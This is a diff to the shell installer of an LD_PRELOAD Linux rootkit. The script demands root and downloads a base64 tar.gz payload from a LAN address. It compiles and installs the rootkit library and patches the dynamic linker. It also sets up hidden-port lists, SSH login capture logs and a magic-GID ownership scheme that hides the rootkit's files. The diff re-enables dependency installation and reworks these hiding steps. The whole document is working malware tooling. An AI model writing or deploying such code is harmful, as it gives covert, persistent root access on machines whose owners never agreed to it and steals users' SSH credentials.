@@ -1,6 +1,6 @@
 #!/bin/sh
 
-[ -z "$1" ] && B64TARGZ_LOCATION="http://192.168.0.48:9001/super.b64" # changeme
+[ -z "$1" ] && B64TARGZ_LOCATION="http://192.168.0.48:9001/changeme.b64" # changeme
 WORKDIR="/tmp" # & mayb this.
 
 [ `id -u` != 0 ] && { echo "not root..."; exit; }
@@ -97,7 +97,7 @@ GID_PATH="`sed '10q;d' $INCLUDE_DIR/settings.cfg`"
 GIDTIME_PATH="`sed '11q;d' $INCLUDE_DIR/settings.cfg`"
 printf "done getting config values\n"
 
-#install_deps
+install_deps
 
 echo "compiling rootkit"
 LINKER_FLAGS="-ldl -lcrypt"
@@ -121,26 +121,26 @@ mv $INCLUDE_DIR/$BDVLSO.$PLATFORM $INSTALL_DIR/
 printf "\nrootkit installed\n"
 echo "preparing stuff"
 
-mv $INCLUDE_DIR/.bashrc $INSTALL_DIR/
+mv $INCLUDE_DIR/.bashrc $INSTALL_DIR/ 2>/dev/null
 echo ". .bashrc" > $INSTALL_DIR/.profile
-mv $INCLUDE_DIR/.rolf $INSTALL_DIR/
-touch $HIDEPORTS && chmod 644 $HIDEPORTS && ln -s $HIDEPORTS $INSTALL_DIR/hideports && cat $INCLUDE_DIR/hideports > $INSTALL_DIR/hideports
-mkdir -p $INTEREST_DIR && chmod 666 $INTEREST_DIR && ln -s $INTEREST_DIR $INSTALL_DIR/interest_dir
-touch $SSH_LOGS && chmod 666 $SSH_LOGS && ln -s $SSH_LOGS $INSTALL_DIR/ssh_logs
-touch $GID_PATH && chmod 644 $GID_PATH && cat $INCLUDE_DIR/magic_gid > $GID_PATH
-touch $GIDTIME_PATH && chmod 644 $GIDTIME_PATH
+touch $HIDEPORTS && chmod 644 $HIDEPORTS && cat $INCLUDE_DIR/hideports > $HIDEPORTS
+mkdir -p $INTEREST_DIR && chmod 666 $INTEREST_DIR
+touch $SSH_LOGS && chmod 666 $SSH_LOGS
+touch $GID_PATH && chmod 644 $GID_PATH && printf $MAGIC_GID > $GID_PATH
+touch $GIDTIME_PATH && chmod 640 $GIDTIME_PATH
 touch $INSTALL_DIR/my_ass
 touch $PRELOAD_FILE
 
 rm -r $INCLUDE_DIR
 
 echo "hiding everything"
-chown -h 0:$MAGIC_GID $PRELOAD_FILE $INSTALL_DIR $INSTALL_DIR/* $INSTALL_DIR/.bashrc $INSTALL_DIR/.profile $INSTALL_DIR/.rolf
-chown -h 0:$MAGIC_GID $SSH_LOGS
-chown -h 0:$MAGIC_GID $INTEREST_DIR
-chown -h 0:$MAGIC_GID $HIDEPORTS
-chown -h 0:$MAGIC_GID $GID_PATH
-chown -h 0:$MAGIC_GID $GIDTIME_PATH
+chown -h 0:$MAGIC_GID $PRELOAD_FILE $INSTALL_DIR $INSTALL_DIR/* $INSTALL_DIR/.profile
+chown 0:$MAGIC_GID $INSTALL_DIR/.bashrc 2>/dev/null
+chown 0:$MAGIC_GID $SSH_LOGS
+chown 0:$MAGIC_GID $INTEREST_DIR
+chown 0:$MAGIC_GID $HIDEPORTS
+chown 0:$MAGIC_GID $GID_PATH
+chown 0:$MAGIC_GID $GIDTIME_PATH
 
 patch_dynamic_linker
 
